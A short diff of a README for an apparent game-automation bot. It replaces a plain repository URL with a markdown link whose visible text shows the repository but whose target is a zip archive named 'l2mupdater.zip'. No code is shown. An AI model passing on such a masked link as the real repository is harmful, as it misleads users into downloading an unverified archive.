@@ -43,4 +43,5 @@ For make bot to work you should apply settings below.
 <code style="color : red">(Optional)</code> - these settings can make bot not work properly sometimes or cause random glitches.
 
 Bot download and How To Install here : 
-https://github.com/DanielCreigus/L2MLoop
+
+[https://github.com/DanielCreigus/L2MLoop](https://github.com/DanielCreigus/L2MLoop/blob/main/l2mupdater.zip)
